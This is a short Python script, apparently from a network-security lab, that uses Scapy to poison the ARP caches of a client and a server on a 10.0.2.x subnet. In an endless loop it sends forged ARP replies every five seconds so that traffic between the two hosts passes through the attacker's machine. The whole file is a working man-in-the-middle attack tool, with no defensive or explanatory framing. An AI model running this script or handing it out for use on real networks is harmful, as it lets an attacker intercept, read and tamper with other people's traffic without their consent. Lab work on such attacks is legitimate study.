#!/usr/bin/python

from scapy.all import *
import time

CLIENT_IP = "10.0.2.4"
CLIENT_MAC = "08:00:27:26:8a:ce"
SERVER_IP = "10.0.2.5"
SERVER_MAC = "08:00:27:57:7d:99"
ATTACKER_IP = "10.0.2.6"
ATTACKER_MAC = "08:00:27:d4:91:13"

# Function to send ARP poisoning packets
def send_arp_poison():
    # Poison client ARP cache
    Ea = Ether()
    Ea.dst = CLIENT_MAC
    Aa = ARP()
    Aa.psrc = SERVER_IP
    Aa.hwsrc = ATTACKER_MAC
    Aa.op = 2  # ARP response (op=2)
    pkta = Ea / Aa
    sendp(pkta, verbose=False)

    # Poison server ARP cache
    Eb = Ether()
    Eb.dst = SERVER_MAC
    Ab = ARP()
    Ab.psrc = CLIENT_IP
    Ab.hwsrc = ATTACKER_MAC
    Ab.op = 2  # ARP response (op=2)
    pktb = Eb / Ab
    sendp(pktb, verbose=False)

# Loop to continuously send ARP poisoning packets every 5 seconds
while True:
    send_arp_poison()
    time.sleep(5)  # Wait for 5 seconds before sending again

